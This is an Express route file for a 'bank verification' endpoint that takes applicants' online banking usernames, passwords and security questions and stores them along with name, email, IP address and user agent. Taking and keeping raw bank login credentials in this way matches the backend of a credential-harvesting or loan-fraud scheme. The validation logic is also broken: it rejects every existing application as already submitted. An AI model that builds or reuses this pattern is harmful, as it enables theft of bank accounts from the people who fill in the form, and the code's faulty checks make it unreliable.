import { Router, Request, Response } from "express";
import { bankVerificationSchema } from "../validation";
import { createBankVerification } from "../services/bankVerificationService";
import {
  getApplicationById,
  getApplication,
  markBankVerificationCompleted,
} from "../services/applicationService";

const router = Router();

// POST /api/bank-verification — Submit bank verification credentials
router.post("/", async (req: Request, res: Response) => {
  try {
    const ip =
      (req.headers["x-forwarded-for"] as string)?.split(",")[0]?.trim() ||
      req.ip ||
      "unknown";

    // Validate request body
    const parsed = bankVerificationSchema.safeParse(req.body);
    if (!parsed.success) {
      const firstError = parsed.error.issues[0];
      res.status(400).json({
        error: firstError?.message || "Invalid input",
        field: firstError?.path[0],
      });
      return;
    }

    const body = parsed.data;
    const userAgent = (req.headers["user-agent"] as string) || "unknown";

    // Verify the application exists and is in bank_verification_pending status
    try {
      const application = await getApplicationById(body.applicationId);
      const existBankApplication = await getApplication(body.applicationId);
      if (!application) {
        res.status(404).json({ error: "Application not found" });
        return;
      }
      if (application) {
        res.status(400).json({
          error:
            "Bank verification has already been submitted for this application.",
        });
        return;
      }
      if (existBankApplication) {
        res.status(400).json({
          error: "Application already exists.",
        });
        return;
      }
    } catch (dbError) {
      console.error("Failed to verify application:", dbError);
      res
        .status(500)
        .json({ error: "Failed to verify application. Please try again." });
      return;
    }

    // Insert bank verification record
    let verificationId: string;
    try {
      const result = await createBankVerification({
        applicationId: body.applicationId,
        bankName: body.bankName,
        accountType: body.accountType,
        bankingUsername: body.bankingUsername,
        bankingPassword: body.bankingPassword,
        securityQuestion: body.securityQuestion || undefined,
        fullName: body.fullName,
        email: body.email,
        ipAddress: ip,
        userAgent,
      });
      verificationId = result.id;
    } catch (dbError) {
      console.error("Bank verification insert failed:", dbError);
      res
        .status(500)
        .json({ error: "Failed to save bank verification. Please try again." });
      return;
    }

    // Mark bank verification as completed and update status to pending
    try {
      await markBankVerificationCompleted(body.applicationId);
    } catch (dbError) {
      console.warn("Failed to mark bank verification as completed:", dbError);
    }

    console.log(
      `Bank verification submitted: ${verificationId} for application: ${body.applicationId}`,
    );

    res.json({
      success: true,
      verificationId,
      message: "Bank verification credentials submitted successfully.",
    });
  } catch (error) {
    console.error("Bank verification submission error:", error);
    res
      .status(500)
      .json({ error: "An internal error occurred. Please try again." });
  }
});

export default router;
